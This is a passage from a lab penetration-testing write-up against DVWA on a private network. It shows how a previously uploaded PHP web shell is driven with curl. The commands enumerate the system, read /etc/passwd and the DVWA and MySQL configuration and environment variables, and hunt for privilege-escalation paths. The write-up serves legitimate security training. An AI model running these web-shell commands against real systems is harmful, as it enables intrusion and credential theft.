<img width="1110" height="387" alt="image" src="https://github.com/user-attachments/assets/01e185a5-dfba-4912-a0e7-2377e0ef9f92" />

<img width="583" height="292" alt="image" src="https://github.com/user-attachments/assets/847c4b57-fcee-4abb-9b03-e767282fce06" />

- **Go to this URL**: http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=whoami
<img width="954" height="273" alt="image" src="https://github.com/user-attachments/assets/8b2b3505-2225-48d0-aeae-bb6ba89b019c" />

- We can use others command like: http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=ls
<img width="892" height="444" alt="image" src="https://github.com/user-attachments/assets/4ca94dc8-b39f-48b4-900a-8878a34a919c" />

Or we can use more command like unix command.

- Or we can use command like with `curl`:
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=ls"
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=id"
````
<img width="736" height="259" alt="image" src="https://github.com/user-attachments/assets/ae797f3b-9518-487f-812f-3b786fef46f4" />


---




## 5. POST-EXPLOITATION

### 1. System Enumeration via Web Shell
Assuming we have web shell at http://192.168.100.97:8080/hackable/uploads/shell.php
- In this we can use direct in browser or we can write commands:

#### System information
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=uname%20-a"
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=cat%20/etc/issue%202>%261"
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=cat%20/etc/os-release%202>%261"
````
<img width="1545" height="558" alt="image" src="https://github.com/user-attachments/assets/e6246d34-72ed-46e9-8a97-43cec2d60b64" />


#### User Information
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=id%202>%261"
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=whoami%202>%261"
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=cat%20/etc/passwd%202>%261"
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=cat%20/etc/group%202>%261"
````
<img width="1025" height="727" alt="image" src="https://github.com/user-attachments/assets/0a472a52-416f-4821-bdcf-7d4b9e319f39" />

<img width="906" height="812" alt="image" src="https://github.com/user-attachments/assets/80dfea31-aa09-489a-912d-0db9bc131efa" />


#### Network Information
- Modern replacement for ifconfig
```
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=ip%20a%202>%261"
```
<img width="999" height="292" alt="image" src="https://github.com/user-attachments/assets/602d446b-e8df-46ff-8387-ab285b7969a0" />

- Listening ports and services
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=ss%20-tulpn%202>%261"
````
<img width="969" height="168" alt="image" src="https://github.com/user-attachments/assets/821f9078-e0af-4af6-8614-5cafe69fa089" />

- Fallback if ss not available:
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=netstat%20-tulpn%202>%261"
````
<img width="997" height="159" alt="image" src="https://github.com/user-attachments/assets/110f5ac5-0b20-4947-b191-0d5c4d571111" />

- In this we can't find with `netsat`.

- Routing table
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=ip%20route%20show%202>%261"
````
<img width="996" height="131" alt="image" src="https://github.com/user-attachments/assets/3fbd1110-defb-4289-83b0-e262c5fbcd78" />

- Fallback:
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=route%20-n%202>%261"
````
<img width="933" height="113" alt="image" src="https://github.com/user-attachments/assets/bcb6a0f5-57e7-4798-8d6e-c28f36e50142" />

- also in this we can't find with `route`



#### Process Information
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=ps%20aux%202>%261"
````
<img width="1906" height="415" alt="image" src="https://github.com/user-attachments/assets/9cab1c6c-c2f0-475c-adb5-2806191c6c96" />

````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=ps%20-ef%202>%261"
````
<img width="1909" height="424" alt="image" src="https://github.com/user-attachments/assets/aa1e80af-50da-4ee6-9be2-4686b0b66093" />

````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=top%20-bn1%202>%261"
````
<img width="937" height="525" alt="image" src="https://github.com/user-attachments/assets/92b4d50e-445b-4102-ba29-ad8c3f78f6f5" />




#### Sensitive Files to Check
- Web app config (DVWA credentials)
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=cat%20/var/www/html/config/config.inc.php%202>%261"
````
<img width="1008" height="819" alt="image" src="https://github.com/user-attachments/assets/c28f775d-05f7-4cad-aab8-3c4dd12ec630" />

- MySQL credentials
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=cat%20/etc/mysql/my.cnf%202>%261"
````
<img width="1395" height="676" alt="image" src="https://github.com/user-attachments/assets/faf59eff-a1a3-4029-8133-91c3b57072bf" />


- Environment variables
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=printenv%202>%261"
````
<img width="1195" height="326" alt="image" src="https://github.com/user-attachments/assets/0924b941-5b37-46ed-a242-9c115a23eabe" />


---

**Important Note:**
Why Why Do We Need URL Encoding?
- URLs can only contain a limited set of characters (letters, digits, and a few safe symbols like -, _, ., ~).
- Any other character: like spaces, `&`, `=`, `<`, `>`, `;`, etc. must be encoded so they don’t break the URL structure or get misinterpreted.

| **Character** | **Encoded Form** | **Description**                                |
| ------------- | ---------------- | ---------------------------------------------- |
| (space)       | `%20`            | Space is not allowed directly in URLs          |
| `&`           | `%26`            | Ampersand — used to separate query parameters  |
| `;`           | `%3B`            | Semicolon — used as a delimiter in some URLs   |
| `>`           | `%3E`            | Greater-than symbol — reserved for HTML/markup |
| `<`           | `%3C`            | Less-than symbol — reserved for HTML/markup    |


**Common Encodings You’ll Use in Pentesting**
|      **Character** | **URL Encode** | **Notes**                                    |
| -----------------: | :------------: | :------------------------------------------- |
|            (space) |      `%20`     | Spaces break URLs — encode them.             |
|                `&` |      `%26`     | Separates query params; encode when literal. |
|                `=` |      `%3D`     | Used in key=value pairs.                     |
|                `;` |      `%3B`     | Delimiter in some contexts.                  |
|                `<` |      `%3C`     | Reserved for markup/HTML.                    |
|                `>` |      `%3E`     | Reserved for markup/HTML.                    |
| `` ` `` (backtick) |      `%60`     | Often used in command/JS contexts.           |
|                `'` |      `%27`     | Single quote — important in SQL/JS contexts. |
|                `"` |      `%22`     | Double quote — used in attributes/strings.   |
|                `#` |      `%23`     | Fragment identifier starter.                 |
|                `?` |      `%3F`     | Starts the query string.                     |

---


----




### 2. Privilege Escalation Checks

#### Sudo Privileges
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=sudo%20-l%202>%261"
````
<img width="1114" height="116" alt="image" src="https://github.com/user-attachments/assets/51f62e73-32d2-4a31-bd85-5a1d4ab6ff76" />

- So in this we can'n find `sudo`.


#### SUID Files (Critical for privilege escalation)
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=find%20/%20-perm%20-4000%202>/dev/null"
````
<img width="1342" height="760" alt="image" src="https://github.com/user-attachments/assets/03f87470-d8e0-4bc3-a1ae-c27219e60a76" />

- so in this we has no `Permission denied`
- Look for unexpected SUID binaries (e.g., `nmap`, `vim`, `find`, `cp`).


#### SGID Files
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=find%20/%20-perm%20-2000%202>/dev/null"
````
<img width="1362" height="797" alt="image" src="https://github.com/user-attachments/assets/b1d1c1e7-99ac-4da6-8fa3-f19999746085" />



#### World-Writable Files (Potential for tampering)
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=find%20/%20-perm%20-0002%20-type%20f%202>/dev/null%20|%20head%20-20"
````
<img width="1719" height="572" alt="image" src="https://github.com/user-attachments/assets/8e313f6f-a804-4696-abf3-8eb46b9dfa33" />

- Focus on scripts/configs in `/etc/`, `/var/www/`, or `/tmp/`.



#### Cron Jobs (For persistence or privilege escalation)
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=crontab%20-l%202>%261"
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=ls%20-la%20/etc/cron*%202>%261"
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=cat%20/etc/crontab%202>%261"
````
<img width="1055" height="591" alt="image" src="https://github.com/user-attachments/assets/dfdab551-d506-47e9-a3ae-f496583500df" />

- So in this crontab has not found.
- If cron jobs run as root and edit world-writable scripts → easy privilege escalation.


#### Kernel Version (For exploit hunting)
````
curl -s "http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=uname%20-r%202>%261"
````
<img width="934" height="117" alt="image" src="https://github.com/user-attachments/assets/d989c482-52d8-407d-a89e-cbd37d121b31" />

- If the system uses RHEL/CentOS, use rpm -qa instead — but DVWA is usually Debian-based.

----


<h2 align="center"> Completed - HTTP Penetration Testing </h2>


<h2 align="center"> 
  &copy; 2026 Nin Kanong (<a href="https://github.com/Nin-Kanong/pentest-writeups">@k4n0ng</a>). All rights reserved.
</h2>
### Date: 17/10/2025
---
